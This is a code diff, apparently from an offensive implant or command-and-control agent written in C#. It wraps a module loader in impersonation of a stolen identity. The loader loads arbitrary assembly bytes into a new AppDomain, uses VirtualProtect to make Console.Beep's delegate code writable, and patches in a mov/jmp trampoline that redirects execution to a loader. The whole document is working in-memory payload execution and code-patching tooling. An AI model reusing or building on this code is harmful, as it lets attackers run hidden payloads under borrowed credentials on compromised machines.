@@ -237,70 +237,73 @@ namespace Tasks
 #region AppDomain Management
         private bool LoadAppDomainModule(String[] sParams, Byte[] bMod, Byte[][] dependencies)
         {
-            AppDomain isolationDomain = AppDomain.CreateDomain(Guid.NewGuid().ToString());
-            isolationDomain.SetData("str", sParams);
-            bool defaultDomain = AppDomain.CurrentDomain.IsDefaultAppDomain();
-            foreach(byte[] dependency in dependencies)
+            using (_agent.GetIdentityManager().GetCurrentImpersonationIdentity().Impersonate())
             {
+                AppDomain isolationDomain = AppDomain.CreateDomain(Guid.NewGuid().ToString());
+                isolationDomain.SetData("str", sParams);
+                bool defaultDomain = AppDomain.CurrentDomain.IsDefaultAppDomain();
+                foreach(byte[] dependency in dependencies)
+                {
+                    try
+                    {
+                        isolationDomain.Load(dependency);
+                    } catch {}
+                }
                 try
                 {
-                    isolationDomain.Load(dependency);
-                } catch {}
-            }
-            try
-            {
-                isolationDomain.Load(bMod);
-            }
-            catch
-            {
+                    isolationDomain.Load(bMod);
+                }
+                catch
+                {
+                    
+                }
+                var sleeve = new CrossAppDomainDelegate(Console.Beep);
+                var ace = new CrossAppDomainDelegate(ActivateLoader);
+
+                RuntimeHelpers.PrepareDelegate(sleeve);
+                RuntimeHelpers.PrepareDelegate(ace);
+
+
+                var flags = BindingFlags.Instance | BindingFlags.NonPublic;
+                var codeSleeve = (IntPtr)sleeve.GetType().GetField("_methodPtrAux", flags).GetValue(sleeve);
+                var codeAce = (IntPtr)ace.GetType().GetField("_methodPtrAux", flags).GetValue(ace);
+
+                if (codeSleeve == IntPtr.Zero || codeAce == IntPtr.Zero)
+                {
+                    return false;
+                }
+                int[] patch = new int[3];
+
+                patch[0] = 10;
+                patch[1] = 11;
+                patch[2] = 12;
+
+                uint oldprotect = 0;
+                if (!_pVirtualProtect(codeSleeve, new UIntPtr((uint) patch[2]), 0x4, out oldprotect))
+                {
+                    return false;
+                }
+                Marshal.WriteByte(codeSleeve, 0x48);
+                Marshal.WriteByte(IntPtr.Add(codeSleeve, 1), 0xb8);
+                Marshal.WriteIntPtr(IntPtr.Add(codeSleeve, 2), codeAce);
+                Marshal.WriteByte(IntPtr.Add(codeSleeve, patch[0]), 0xff);
+                Marshal.WriteByte(IntPtr.Add(codeSleeve, patch[1]), 0xe0);
+                if (!_pVirtualProtect(codeSleeve, new UIntPtr((uint) patch[2]), oldprotect, out oldprotect))
+                {
+                    return false;
+                }
                 
+                try
+                {
+                    isolationDomain.DoCallBack(sleeve);
+                }
+                catch (Exception ex)
+                {
+                    return false;
+                }
+                UnloadAppDomain(isolationDomain);
+                return true;   
             }
-            var sleeve = new CrossAppDomainDelegate(Console.Beep);
-            var ace = new CrossAppDomainDelegate(ActivateLoader);
-
-            RuntimeHelpers.PrepareDelegate(sleeve);
-            RuntimeHelpers.PrepareDelegate(ace);
-
-
-            var flags = BindingFlags.Instance | BindingFlags.NonPublic;
-            var codeSleeve = (IntPtr)sleeve.GetType().GetField("_methodPtrAux", flags).GetValue(sleeve);
-            var codeAce = (IntPtr)ace.GetType().GetField("_methodPtrAux", flags).GetValue(ace);
-
-            if (codeSleeve == IntPtr.Zero || codeAce == IntPtr.Zero)
-            {
-                return false;
-            }
-            int[] patch = new int[3];
-
-            patch[0] = 10;
-            patch[1] = 11;
-            patch[2] = 12;
-
-            uint oldprotect = 0;
-            if (!_pVirtualProtect(codeSleeve, new UIntPtr((uint) patch[2]), 0x4, out oldprotect))
-            {
-                return false;
-            }
-            Marshal.WriteByte(codeSleeve, 0x48);
-            Marshal.WriteByte(IntPtr.Add(codeSleeve, 1), 0xb8);
-            Marshal.WriteIntPtr(IntPtr.Add(codeSleeve, 2), codeAce);
-            Marshal.WriteByte(IntPtr.Add(codeSleeve, patch[0]), 0xff);
-            Marshal.WriteByte(IntPtr.Add(codeSleeve, patch[1]), 0xe0);
-            if (!_pVirtualProtect(codeSleeve, new UIntPtr((uint) patch[2]), oldprotect, out oldprotect))
-            {
-                return false;
-            }
-            
-            try
-            {
-                isolationDomain.DoCallBack(sleeve);
-            }
-            catch (Exception ex)
-            {
-                return false;
-            }
-            UnloadAppDomain(isolationDomain);
-            return true;
         }
         private static void UnloadAppDomain(AppDomain oDomain)
         {
